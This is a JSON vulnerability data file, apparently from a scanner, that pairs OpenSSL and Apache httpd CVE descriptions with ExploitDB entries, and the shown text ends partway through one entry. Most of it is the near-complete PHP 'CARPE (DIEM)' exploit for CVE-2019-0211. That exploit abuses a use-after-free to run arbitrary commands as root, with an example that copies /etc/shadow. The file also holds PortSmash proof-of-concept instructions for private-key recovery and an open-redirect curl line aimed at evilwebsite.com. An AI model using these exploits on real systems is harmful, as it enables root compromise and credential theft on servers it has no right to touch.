                "description": "OpenSSL has internal defaults for a directory tree where it can find a configuration file as well as certificates used for verification in TLS. This directory is most commonly referred to as OPENSSLDIR, and is configurable with the --prefix / --openssldir configuration options. For OpenSSL versions 1.1.0 and 1.1.1, the mingw configuration targets assume that resulting programs and libraries are installed in a Unix-like environment and the default prefix for program installation as well as for OPENSSLDIR should be '/usr/local'. However, mingw programs are Windows programs, and as such, find themselves looking at sub-directories of 'C:/usr/local', which may be world writable, which enables untrusted users to modify OpenSSL's default configuration, insert CA certificates, modify (or even replace) existing engine modules, etc. For OpenSSL 1.0.2, '/usr/local/ssl' is used as default for OPENSSLDIR on all Unix and Windows targets, including Visual C builds. However, some build instructions for the diverse Windows targets on 1.0.2 encourage you to specify your own --prefix. OpenSSL versions 1.1.1, 1.1.0 and 1.0.2 are affected by this issue. Due to the limited scope of affected deployments this has been assessed as low severity and therefore we are not creating new releases at this time. Fixed in OpenSSL 1.1.1d (Affected 1.1.1-1.1.1c). Fixed in OpenSSL 1.1.0l (Affected 1.1.0-1.1.0k). Fixed in OpenSSL 1.0.2t (Affected 1.0.2-1.0.2s).",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-1552"
                ],
                "msb": []
            }
        ],
        "CVE-2018-0737": [
            {
                "source": "CVE",
                "_id": "2018-0737",
                "description": "The OpenSSL RSA Key generation algorithm has been shown to be vulnerable to a cache timing side channel attack. An attacker with sufficient access to mount cache timing attacks during the RSA key generation process could recover the private key. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2b-1.0.2o).",
                "osvdb": [],
                "bid": [
                    103766
                ],
                "cve": [
                    "CVE-2018-0737"
                ],
                "msb": []
            }
        ],
        "CVE-2018-0734": [
            {
                "source": "CVE",
                "_id": "2018-0734",
                "description": "The OpenSSL DSA signature algorithm has been shown to be vulnerable to a timing side channel attack. An attacker could use variations in the signing algorithm to recover the private key. Fixed in OpenSSL 1.1.1a (Affected 1.1.1). Fixed in OpenSSL 1.1.0j (Affected 1.1.0-1.1.0i). Fixed in OpenSSL 1.0.2q (Affected 1.0.2-1.0.2p).",
                "osvdb": [],
                "bid": [
                    105758
                ],
                "cve": [
                    "CVE-2018-0734"
                ],
                "msb": []
            }
        ],
        "CVE-2019-0196": [
            {
                "source": "CVE",
                "_id": "2019-0196",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.17 to 2.4.38. Using fuzzed network input, the http/2 request handling could be made to access freed memory in string comparison when determining the method of a request and thus process the request incorrectly.",
                "osvdb": [],
                "bid": [
                    107669
                ],
                "cve": [
                    "CVE-2019-0196"
                ],
                "msb": []
            }
        ],
        "CVE-2018-0732": [
            {
                "source": "CVE",
                "_id": "2018-0732",
                "description": "During key agreement in a TLS handshake using a DH(E) based ciphersuite a malicious server can send a very large prime value to the client. This will cause the client to spend an unreasonably long period of time generating a key for this prime resulting in a hang until the client has finished. This could be exploited in a Denial Of Service attack. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2-1.0.2o).",
                "osvdb": [],
                "bid": [
                    104442
                ],
                "cve": [
                    "CVE-2018-0732"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1333": [
            {
                "source": "CVE",
                "_id": "2018-1333",
                "description": "By specially crafting HTTP/2 requests, workers would be allocated 60 seconds longer than necessary, leading to worker exhaustion and a denial of service. Fixed in Apache HTTP Server 2.4.34 (Affected 2.4.18-2.4.30,2.4.33).",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-1333"
                ],
                "msb": []
            }
        ],
        "CVE-2020-1927": [],
        "CVE-2018-5407": [
            {
                "source": "CVE",
                "_id": "2018-5407",
                "description": "Simultaneous Multi-threading (SMT) in processors can enable local users to exploit software vulnerable to timing attacks via a side-channel timing attack on 'port contention'.",
                "osvdb": [],
                "bid": [
                    105897
                ],
                "cve": [
                    "CVE-2018-5407"
                ],
                "msb": []
            },
            {
                "code": "# Summary\r\n\r\nThis is a proof-of-concept exploit of the PortSmash microarchitecture attack, tracked by CVE-2018-5407.\r\n\r\n![Alt text](parse_raw_simple.png?raw=true \"Title\")\r\n\r\n# Setup\r\n\r\n## Prerequisites\r\n\r\nA CPU featuring SMT (e.g. Hyper-Threading) is the only requirement.\r\n\r\nThis exploit code should work out of the box on Skylake and Kaby Lake. For other SMT architectures, customizing the strategies and/or waiting times in `spy` is likely needed.\r\n\r\n## OpenSSL\r\n\r\nDownload and install OpenSSL 1.1.0h or lower:\r\n\r\n    cd /usr/local/src\r\n    wget https://www.openssl.org/source/openssl-1.1.0h.tar.gz\r\n    tar xzf openssl-1.1.0h.tar.gz\r\n    cd openssl-1.1.0h/\r\n    export OPENSSL_ROOT_DIR=/usr/local/ssl\r\n    ./config -d shared --prefix=$OPENSSL_ROOT_DIR --openssldir=$OPENSSL_ROOT_DIR -Wl,-rpath=$OPENSSL_ROOT_DIR/lib\r\n    make -j8\r\n    make test\r\n    sudo checkinstall --strip=no --stripso=no --pkgname=openssl-1.1.0h-debug --provides=openssl-1.1.0h-debug --default make install_sw\r\n\r\nIf you use a different path, you'll need to make changes to `Makefile` and `sync.sh`.\r\n\r\n# Tooling\r\n\r\n## freq.sh\r\n\r\nTurns off frequency scaling and TurboBoost.\r\n\r\n## sync.sh\r\n\r\nSync trace through pipes. It has two victims, one of which should be active at a time:\r\n\r\n1. The stock `openssl` running `dgst` command to produce a P-384 signature.\r\n2. A harness `ecc` that calls scalar multiplication directly with a known key. (Useful for profiling.)\r\n\r\nThe script will generate a P-384 key pair in `secp384r1.pem` if it does not already exist.\r\n\r\nThe script outputs `data.bin` which is what `openssl dgst` signed, and you should be able to verify the ECDSA signature `data.sig` afterwards with\r\n\r\n    openssl dgst -sha512 -verify secp384r1.pem -signature data.sig data.bin\r\n\r\nIn the `ecc` tool case, `data.bin` and `secp384r1.pem` are meaningless and `data.sig` is not created.\r\n\r\nFor the `taskset` commands in `sync.sh`, the cores need to be two logical cores of the same physical core; sanity check with\r\n\r\n    $ grep '^core id' /proc/cpuinfo\r\n    core id\t\t: 0\r\n    core id\t\t: 1\r\n    core id\t\t: 2\r\n    core id\t\t: 3\r\n    core id\t\t: 0\r\n    core id\t\t: 1\r\n    core id\t\t: 2\r\n    core id\t\t: 3\r\n\r\nSo the script is currently configured for logical cores 3 and 7 that both map to physical core 3 (`core_id`).\r\n\r\n## spy\r\n\r\nMeasurement process that outputs measurements in `timings.bin`. To change the `spy` strategy, check the port defines in `spy.h`. Only one strategy should be active at build time.\r\n\r\nNote that `timings.bin` is actually raw clock cycle counter values, not latencies. Look in `parse_raw_simple.py` to understand the data format if necessary.\r\n\r\n## ecc\r\n\r\nVictim harness for running OpenSSL scalar multiplication with known inputs. Example:\r\n\r\n    ./ecc M 4 deadbeef0123456789abcdef00000000c0ff33\r\n\r\nWill execute 4 consecutive calls to `EC_POINT_mul` with the given hex scalar.\r\n\r\n## parse_raw_simple.py\r\n\r\nQuick and dirty hack to view 1D traces. The top plot is the raw trace. Everything below is a different digital filter of the raw trace for viewing purposes. Zoom and pan are your friends here.\r\n\r\nYou might have to adjust the `CEIL` variable if the plots are too aggressively clipped.\r\n\r\nPython packages:\r\n\r\n    sudo apt-get install python-numpy python-matplotlib\r\n\r\n# Usage\r\n\r\nTurn off frequency scaling:\r\n\r\n    ./freq.sh\r\n\r\nMake sure everything builds:\r\n\r\n    make clean\r\n    make\r\n\r\nTake a measurement:\r\n\r\n    ./sync.sh\r\n\r\nView the trace:\r\n\r\n    python parse_raw_simple.py timings.bin\r\n\r\nYou can play around with one victim at a time in `sync.sh`. Sample output for the `openssl dgst` victim is in `parse_raw_simple.png`.\r\n\r\n# Credits\r\n\r\n* Alejandro Cabrera Aldaya (Universidad Tecnol\u00f3gica de la Habana (CUJAE), Habana, Cuba)\r\n* Billy Bob Brumley (Tampere University of Technology, Tampere, Finland)\r\n* Sohaib ul Hassan (Tampere University of Technology, Tampere, Finland)\r\n* Cesar Pereida Garc\u00eda (Tampere University of Technology, Tampere, Finland)\r\n* Nicola Tuveri (Tampere University of Technology, Tampere, Finland)\r\n\r\n\r\n\r\n\r\nEDB Download: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45785.zip",
                "description": "Intel (Skylake / Kaby Lake) - 'PortSmash' CPU SMT Side-Channel",
                "author": "Billy Brumley",
                "_id": 45785,
                "source": "ExploitDB",
                "platform": "hardware",
                "date": "2018-11-02T00:00:00+00:00",
                "cve": [
                    "CVE-2018-5407"
                ],
                "type": "local",
                "port": 0
            }
        ],
        "CVE-2021-23840": [],
        "CVE-2019-0220": [
            {
                "source": "CVE",
                "_id": "2019-0220",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.0 to 2.4.38. When the path component of a request URL contains multiple consecutive slashes ('/'), directives such as LocationMatch and RewriteRule must account for duplicates in regular expressions while other aspects of the servers processing will implicitly collapse them.",
                "osvdb": [],
                "bid": [
                    107670
                ],
                "cve": [
                    "CVE-2019-0220"
                ],
                "msb": []
            }
        ],
        "CVE-2019-10098": [
            {
                "source": "CVE",
                "_id": "2019-10098",
                "description": "In Apache HTTP server 2.4.0 to 2.4.39, Redirects configured with mod_rewrite that were intended to be self-referential might be fooled by encoded newlines and redirect instead to an unexpected URL within the request URL.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-10098"
                ],
                "msb": []
            },
            {
                "code": "Normal URLs like http://redirect.local/test will be forwared to https://redirect.local/test. But by using newlines (CVE 2019-10098), we can redirect somewhere else (i.e. to `https://redirect.local.evilwebsite.com`):\r\n\r\n```\r\ncurl -Ik 'https://redirect.local/%0a.evilwebsite.com' --path-as-is\r\nHTTP/2 302 \r\ndate: Mon, 28 Oct 2019 03:36:58 GMT\r\ncontent-type: text/html; charset=iso-8859-1\r\nlocation: https://redirect.local.evilwebsite.com\r\n```",
                "description": "Apache Httpd mod_rewrite - Open Redirects",
                "author": "Sebastian Neef",
                "_id": 47689,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-10-14T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2021-23841": [],
        "CVE-2019-0211": [
            {
                "source": "CVE",
                "_id": "2019-0211",
                "description": "In Apache HTTP Server 2.4 releases 2.4.17 to 2.4.38, with MPM event, worker or prefork, code executing in less-privileged child processes or threads (including scripts executed by an in-process scripting interpreter) could execute arbitrary code with the privileges of the parent process (usually root) by manipulating the scoreboard. Non-Unix systems are not affected.",
                "osvdb": [],
                "bid": [
                    107666
                ],
                "cve": [
                    "CVE-2019-0211"
                ],
                "msb": []
            },
            {
                "code": "<?php\r\n# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation\r\n# Charles Fol\r\n# @cfreal_\r\n# 2019-04-08\r\n#\r\n# INFOS\r\n#\r\n# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html\r\n#\r\n# USAGE\r\n#\r\n# 1. Upload exploit to Apache HTTP server\r\n# 2. Send request to page\r\n# 3. Await 6:25AM for logrotate to restart Apache\r\n# 4. python3.5 is now suid 0\r\n#\r\n# You can change the command that is ran as root using the cmd HTTP\r\n# parameter (GET/POST).\r\n# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/\r\n#\r\n# SUCCESS RATE\r\n#\r\n# Number of successful and failed exploitations relative to of the number\r\n# of MPM workers (i.e. Apache subprocesses). YMMV.\r\n#\r\n# W  --% S   F\r\n#  5 87% 177 26 (default)\r\n#  8 89%  60  8\r\n# 10 95%  70  4\r\n#\r\n# More workers, higher success rate.\r\n# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.\r\n# Generally, failure is due to all_buckets being relocated too far from its\r\n# original address.\r\n#\r\n# TESTED ON\r\n#\r\n# - Apache/2.4.25\r\n# - PHP 7.2.12\r\n# - Debian GNU/Linux 9.6\r\n#\r\n# TESTING\r\n#\r\n# $ curl http://localhost/cfreal-carpediem.php\r\n# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force\r\n# $ ls -alh /usr/bin/python3.5\r\n# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5\r\n#\r\n# There are no hardcoded addresses.\r\n# - Addresses read through /proc/self/mem\r\n# - Offsets read through ELF parsing\r\n#\r\n# As usual, there are tons of comments.\r\n#\r\n\r\n\r\no('CARPE (DIEM) ~ CVE-2019-0211');\r\no('');\r\n\r\nerror_reporting(E_ALL);\r\n\r\n\r\n# Starts the exploit by triggering the UAF.\r\nfunction real()\r\n{\r\n\tglobal $y;\r\n\t$y = [new Z()];\r\n\tjson_encode([0 => &$y]);\r\n}\r\n\r\n# In order to read/write what comes after in memory, we need to UAF a string so\r\n# that we can control its size and make in-place edition.\r\n# An easy way to do that is to replace the string by a timelib_rel_time\r\n# structure of which the first bytes can be reached by the (y, m, d, h, i, s)\r\n# properties of the DateInterval object.\r\n#\r\n# Steps:\r\n# - Create a base object (Z)\r\n# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)\r\n# - Create DateInterval object ($place) meant to be unset and filled by another\r\n# - Trigger the UAF by unsetting $y[0], which is still reachable using $this\r\n# - Unset $place: at this point, if we create a new DateInterval object, it will\r\n#   replace $place in memory\r\n# - Create a string ($holder) that fills $place's timelib_rel_time structure\r\n# - Allocate a new DateInterval object: its timelib_rel_time structure will\r\n#   end up in place of abc\r\n# - Now we can control $this->abc's zend_string structure entirely using\r\n#   y, m, d etc.\r\n# - Increase abc's size so that we can read/write memory that comes after it,\r\n#   especially the shared memory block\r\n# - Find out all_buckets' position by finding a memory region that matches the\r\n#   mutex->meth structure\r\n# - Compute the bucket index required to reach the SHM and get an arbitrary\r\n#   function call\r\n# - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the\r\n#   bucket\r\nclass Z implements JsonSerializable\r\n{\r\n\tpublic function jsonSerialize()\r\n\t{\r\n\t\tglobal $y, $addresses, $workers_pids;\r\n\r\n\t\t#\r\n\t\t# Setup memory\r\n\t\t#\r\n        o('Triggering UAF');\r\n\t\to('  Creating room and filling empty spaces');\r\n\r\n\t\t# Fill empty blocks to make sure our allocations will be contiguous\r\n\t\t# I: Since a lot of allocations/deallocations happen before the script\r\n\t\t# is ran, two variables instanciated at the same time might not be\r\n\t\t# contiguous: this can be a problem for a lot of reasons.\r\n\t\t# To avoid this, we instanciate several DateInterval objects. These\r\n\t\t# objects will fill a lot of potentially non-contiguous memory blocks,\r\n\t\t# ensuring we get \"fresh memory\" in upcoming allocations.\r\n\t\t$contiguous = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$contiguous[] = new DateInterval('PT1S');\r\n\r\n\t\t# Create some space for our UAF blocks not to get overwritten\r\n\t\t# I: A PHP object is a combination of a lot of structures, such as\r\n\t\t# zval, zend_object, zend_object_handlers, zend_string, etc., which are\r\n\t\t# all allocated, and freed when the object is destroyed.\r\n\t\t# After the UAF is triggered on the object, all the structures that are\r\n\t\t# used to represent it will be marked as free.\r\n\t\t# If we create other variables afterwards, those variables might be\r\n\t\t# allocated in the object's previous memory regions, which might pose\r\n\t\t# problems for the rest of the exploitation.\r\n\t\t# To avoid this, we allocate a lot of objects before the UAF, and free\r\n\t\t# them afterwards. Since PHP's heap is LIFO, when we create other vars,\r\n\t\t# they will take the place of those objects instead of the object we\r\n\t\t# are triggering the UAF on. This means our object is \"shielded\" and\r\n\t\t# we don't have to worry about breaking it.\r\n\t\t$room = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$room[] = new Z();\r\n\r\n\t\t# Build string meant to fill old DateInterval's timelib_rel_time\r\n\t\t# I: ptr2str's name is unintuitive here: we just want to allocate a\r\n\t\t# zend_string of size 78.\r\n\t\t$_protector = ptr2str(0, 78);\r\n\r\n\t\to('  Allocating $abc and $p');\r\n\r\n\t\t# Create ABC\r\n\t\t# I: This is the variable we will use to R/W memory afterwards.\r\n\t\t# After we free the Z object, we'll make sure abc is overwritten by a\r\n\t\t# timelib_rel_time structure under our control. The first 8*8 = 64 bytes\r\n\t\t# of this structure can be modified easily, meaning we can change the\r\n\t\t# size of abc. This will allow us to read/write memory after abc.\r\n\t\t$this->abc = ptr2str(0, 79);\r\n\r\n\t\t# Create $p meant to protect $this's blocks\r\n\t\t# I: Right after we trigger the UAF, we will unset $p.\r\n\t\t# This means that the timelib_rel_time structure (TRT) of this object\r\n\t\t# will be freed. We will then allocate a string ($protector) of the same\r\n\t\t# size as TRT. Since PHP's heap is LIFO, the string will take the place\r\n\t\t# of the now-freed TRT in memory.\r\n\t\t# Then, we create a new DateInterval object ($x). From the same\r\n\t\t# assumption, every structure constituting this new object will take the\r\n\t\t# place of the previous structure. Nevertheless, since TRT's memory\r\n\t\t# block has already been replaced by $protector, the new TRT will be put\r\n\t\t# in the next free blocks of the same size, which happens to be $abc\r\n\t\t# (remember, |abc| == |timelib_rel_time|).\r\n\t\t# We now have the following situation: $x is a DateInterval object whose\r\n\t\t# internal TRT structure has the same address as $abc's zend_string.\r\n\t\t$p = new DateInterval('PT1S');\r\n\r\n\t\t#\r\n\t\t# Trigger UAF\r\n\t\t#\r\n\t\t\r\n\t\to('  Unsetting both variables and setting $protector');\r\n\t\t# UAF here, $this is usable despite being freed\r\n\t\tunset($y[0]);\r\n\t\t# Protect $this's freed blocks\r\n\t\tunset($p);\r\n\r\n\t\t# Protect $p's timelib_rel_time structure\r\n\t\t$protector = \".$_protector\";\r\n\t\t# !!! This is only required for apache\r\n\t\t# Got no idea as to why there is an extra deallocation (?)\r\n\t\t$room[] = \"!$_protector\";\r\n\r\n\t\to('  Creating DateInterval object');\r\n\t\t# After this line:\r\n\t\t# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str\r\n\t\t# We can control the structure of $this->abc and therefore read/write\r\n\t\t# anything that comes after it in memory by changing its size and\r\n\t\t# making in-place edits using $this->abc[$position] = $char\r\n\t\t$x = new DateInterval('PT1S');\r\n\t\t# zend_string.refcount = 0\r\n\t\t# It will get incremented at some point, and if it is > 1,\r\n\t\t# zend_assign_to_string_offset() will try to duplicate it before making\r\n\t\t# the in-place replacement\r\n\t\t$x->y = 0x00;\r\n\t\t# zend_string.len\r\n\t\t$x->d = 0x100;\r\n\t\t# zend_string.val[0-4]\r\n\t\t$x->h = 0x13121110;\r\n\r\n\t\t# Verify UAF was successful\r\n\t\t# We modified stuff via $x; they should be visible by $this->abc, since\r\n\t\t# they are at the same memory location.\r\n\t\tif(!(\r\n\t\t\tstrlen($this->abc) === $x->d &&\r\n\t\t\t$this->abc[0] == \"\\x10\" &&\r\n\t\t\t$this->abc[1] == \"\\x11\" &&\r\n\t\t\t$this->abc[2] == \"\\x12\" &&\r\n\t\t\t$this->abc[3] == \"\\x13\"\r\n\t\t))\r\n\t\t{\r\n\t\t\to('UAF failed, exiting.');\r\n\t\t\texit();\r\n\t\t}\r\n\t\to('UAF successful.');\r\n\t\to('');\r\n\r\n\t\t# Give us some room\r\n\t\t# I: As indicated before, just unset a lot of stuff so that next allocs\r\n\t\t# don't break our fragile UAFd structure.\r\n\t\tunset($room);\r\n\r\n\t\t#\r\n\t\t# Setup the R/W primitive\r\n\t\t#\r\n\r\n\t\t# We control $abc's internal zend_string structure, therefore we can R/W\r\n\t\t# the shared memory block (SHM), but for that we need to know the\r\n\t\t# position of $abc in memory\r\n\t\t# I: We know the absolute position of the SHM, so we need to need abc's\r\n\t\t# as well, otherwise we cannot compute the offset\r\n\r\n\t\t# Assuming the allocation was contiguous, memory looks like this, with\r\n\t\t# 0x70-sized fastbins:\r\n\t\t# \t[zend_string:abc]\r\n\t\t# \t[zend_string:protector]\r\n\t\t# \t[FREE#1]\r\n\t\t# \t[FREE#2]\r\n\t\t# Therefore, the address of the 2nd free block is in the first 8 bytes\r\n\t\t# of the first block: 0x70 * 2 - 24\r\n\t\t$address = str2ptr($this->abc, 0x70 * 2 - 24);\r\n\t\t# The address we got points to FREE#2, hence we're |block| * 3 higher in\r\n\t\t# memory\r\n\t\t$address = $address - 0x70 * 3;\r\n\t\t# The beginning of the string is 24 bytes after its origin\r\n\t\t$address = $address + 24;\r\n\t\to('Address of $abc: 0x' . dechex($address));\r\n\t\to('');\r\n\r\n\t\t# Compute the size required for our string to include the whole SHM and\r\n\t\t# apache's memory region\r\n\t\t$distance = \r\n\t\t\tmax($addresses['apache'][1], $addresses['shm'][1]) -\r\n\t\t\t$address\r\n\t\t;\r\n\t\t$x->d = $distance;\r\n\r\n\t\t# We can now read/write in the whole SHM and apache's memory region.\r\n\r\n\t\t#\r\n\t\t# Find all_buckets in memory\r\n\t\t#\r\n\r\n\t\t# We are looking for a structure s.t.\r\n\t\t# |all_buckets, mutex| = 0x10\r\n\t\t# |mutex, meth| = 0x8\r\n\t\t# all_buckets is in apache's memory region\r\n\t\t# mutex is in apache's memory region\r\n\t\t# meth is in libaprR's memory region\r\n\t\t# meth's function pointers are in libaprX's memory region\r\n\t\to('Looking for all_buckets in memory');\r\n\t\t$all_buckets = 0;\r\n\r\n\t\tfor(\r\n\t\t\t$i = $addresses['apache'][0] + 0x10;\r\n\t\t\t$i < $addresses['apache'][1] - 0x08;\r\n\t\t\t$i += 8\r\n\t\t)\r\n\t\t{\r\n\t\t\t# mutex\r\n\t\t\t$mutex = $pointer = str2ptr($this->abc, $i - $address);\r\n\t\t\tif(!in($pointer, $addresses['apache']))\r\n\t\t\t\tcontinue;\r\n\r\n\r\n\t\t\t# meth\r\n\t\t\t$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);\r\n\t\t\tif(!in($pointer, $addresses['libaprR']))\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\to('  [&mutex]: 0x' . dechex($i));\r\n\t\t\to('    [mutex]: 0x' . dechex($mutex));\r\n\t\t\to('      [meth]: 0x' . dechex($meth));\r\n\r\n\r\n\t\t\t# meth->*\r\n\t\t\t# flags\r\n\t\t\tif(str2ptr($this->abc, $pointer - $address) != 0)\r\n\t\t\t\tcontinue;\r\n\t\t\t# methods\r\n\t\t\tfor($j=0;$j<7;$j++)\r\n\t\t\t{\r\n\t\t\t\t$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address);\r\n\t\t\t\tif(!in($m, $addresses['libaprX']))\r\n\t\t\t\t\tcontinue 2;\r\n\t\t\t\to('        [*]: 0x' . dechex($m));\r\n\t\t\t}\r\n\r\n\t\t\t$all_buckets = $i - 0x10;\r\n\t\t\to('all_buckets = 0x' . dechex($all_buckets));\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tif(!$all_buckets)\r\n\t\t{\r\n\t\t\to('Unable to find all_buckets');\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\r\n\t\t# The address of all_buckets will change when apache is gracefully\r\n\t\t# restarted. This is a problem because we need to know all_buckets's\r\n\t\t# address in order to make all_buckets[some_index] point to a memory\r\n\t\t# region we control.\r\n\r\n\t\t#\r\n\t\t# Compute potential bucket indexes and their addresses\r\n\t\t#\r\n\r\n        o('Computing potential bucket indexes and addresses');\r\n\r\n\t\t# Since we have sizeof($workers_pid) MPM workers, we can fill the rest\r\n\t\t# of the ap_score_image->servers items, so 256 - sizeof($workers_pids),\r\n\t\t# with data we like. We keep the one at the top to store our payload.\r\n\t\t# The rest is sprayed with the address of our payload.\r\n\r\n\t\t$size_prefork_child_bucket = 24;\r\n\t\t$size_worker_score = 264;\r\n\t\t# I get strange errors if I use every \"free\" item, so I leave twice as\r\n\t\t# many items free. I'm guessing upon startup some\r\n\t\t$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);\r\n\t\t$spray_max = $addresses['shm'][1];\r\n\t\t$spray_min = $spray_max - $spray_size;\r\n\r\n\t\t$spray_middle = (int) (($spray_min + $spray_max) / 2);\r\n\t\t$bucket_index_middle = (int) (\r\n\t\t\t- ($all_buckets - $spray_middle) /\r\n\t\t\t$size_prefork_child_bucket\r\n\t\t);\r\n\r\n\t\t#\r\n\t\t# Build payload\r\n\t\t#\r\n\r\n\t\t# A worker_score structure was kept empty to put our payload in\r\n\t\t$payload_start = $spray_min - $size_worker_score;\r\n\r\n\t\t$z = ptr2str(0);\r\n\r\n    \t# Payload maxsize 264 - 112 = 152\r\n\t\t# Offset 8 cannot be 0, but other than this you can type whatever\r\n\t\t# command you want\r\n    \t$bucket = isset($_REQUEST['cmd']) ?\r\n    \t\t$_REQUEST['cmd'] :\r\n    \t\t\"chmod +s /usr/bin/python3.5\";\r\n\r\n    \tif(strlen($bucket) > $size_worker_score - 112)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Payload size is bigger than available space (' .\r\n\t\t\t\t($size_worker_score - 112) .\r\n\t\t\t\t'), exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n    \t# Align\r\n    \t$bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\");\r\n\r\n    \t# apr_proc_mutex_unix_lock_methods_t\r\n\t\t$meth = \r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t\t# child_init\r\n\t\t    ptr2str($addresses['zend_object_std_dtor'])\r\n\t\t;\r\n\r\n\t\t# The second pointer points to meth, and is used before reaching the\r\n\t\t# arbitrary function call\r\n\t\t# The third one and the last one are both used by the function call\r\n\t\t# zend_object_std_dtor(object) => ... => system(&arData[0]->val)\r\n\t\t$properties = \r\n\t\t\t# refcount\r\n\t\t\tptr2str(1) .\r\n\t\t\t# u-nTableMask meth\r\n\t\t\tptr2str($payload_start + strlen($bucket)) .\r\n\t\t\t# Bucket arData\r\n\t\t\tptr2str($payload_start) .\r\n\t\t\t# uint32_t nNumUsed;\r\n\t\t\tptr2str(1, 4) .\r\n\t\t    # uint32_t nNumOfElements;\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nTableSize\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nInternalPointer\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# zend_long nNextFreeElement\r\n\t\t\t$z .\r\n\t\t\t# dtor_func_t pDestructor\r\n\t\t\tptr2str($addresses['system'])\r\n\t\t;\r\n\r\n\t\t$payload =\r\n\t\t\t$bucket .\r\n\t\t\t$meth .\r\n\t\t\t$properties\r\n\t\t;\r\n\r\n\t\t# Write the payload\r\n\r\n\t\to('Placing payload at address 0x' . dechex($payload_start));\r\n\r\n\t\t$p = $payload_start - $address;\r\n\t\tfor(\r\n\t\t\t$i = 0;\r\n\t\t\t$i < strlen($payload);\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$p+$i] = $payload[$i];\r\n\t\t}\r\n\r\n\t\t# Fill the spray area with a pointer to properties\r\n\t\t\r\n\t\t$properties_address = $payload_start + strlen($bucket) + strlen($meth);\r\n\t\to('Spraying pointer');\r\n\t\to('  Address: 0x' . dechex($properties_address));\r\n\t\to('  From: 0x' . dechex($spray_min));\r\n\t\to('  To: 0x' . dechex($spray_max));\r\n\t\to('  Size: 0x' . dechex($spray_size));\r\n\t\to('  Covered: 0x' . dechex($spray_size * count($workers_pids)));\r\n\t\to('  Apache: 0x' . dechex(\r\n\t\t\t$addresses['apache'][1] -\r\n\t\t\t$addresses['apache'][0]\r\n\t\t));\r\n\r\n\t\t$s_properties_address = ptr2str($properties_address);\r\n\r\n\t\tfor(\r\n\t\t\t$i = $spray_min;\r\n\t\t\t$i < $spray_max;\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$i - $address] = $s_properties_address[$i % 8];\r\n\t\t}\r\n\t\to('');\r\n\r\n\t\t# Find workers PID in the SHM: it indicates the beginning of their\r\n\t\t# process_score structure. We can then change process_score.bucket to\r\n\t\t# the index we computed. When apache reboots, it will use\r\n\t\t# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex\r\n\t\t# which means we control the whole apr_proc_mutex_t structure.\r\n\t\t# This structure contains pointers to multiple functions, especially\r\n\t\t# mutex->meth->child_init(), which will be called before privileges\r\n\t\t# are dropped.\r\n\t\t# We do this for every worker PID, incrementing the bucket index so that\r\n\t\t# we cover a bigger range.\r\n\t\t\r\n\t\to('Iterating in SHM to find PIDs...');\r\n\r\n\t\t# Number of bucket indexes covered by our spray\r\n\t\t$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);\r\n\t\t# Number of bucket indexes covered by our spray and the PS structures\r\n\t\t$total_nb_buckets = $spray_nb_buckets * count($workers_pids);\r\n\t\t# First bucket index to handle\r\n\t\t$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);\r\n\r\n\t\t# Iterate over every process_score structure until we find every PID or\r\n\t\t# we reach the end of the SHM\r\n\t\tfor(\r\n\t\t\t$p = $addresses['shm'][0] + 0x20;\r\n\t\t\t$p < $addresses['shm'][1] && count($workers_pids) > 0;\r\n\t\t\t$p += 0x24\r\n\t\t)\r\n\t\t{\r\n\t\t\t$l = $p - $address;\r\n\t\t\t$current_pid = str2ptr($this->abc, $l, 4);\r\n\t\t\to('Got PID: ' . $current_pid);\r\n\t\t\t# The PID matches one of the workers\r\n\t\t\tif(in_array($current_pid, $workers_pids))\r\n\t\t\t{\r\n\t\t\t\tunset($workers_pids[$current_pid]);\r\n\t\t\t\to('  PID matches');\r\n\t\t\t\t# Update bucket address\r\n\t\t\t\t$s_bucket_index = pack('l', $bucket_index);\r\n\t\t\t\t$this->abc[$l + 0x20] = $s_bucket_index[0];\r\n\t\t\t\t$this->abc[$l + 0x21] = 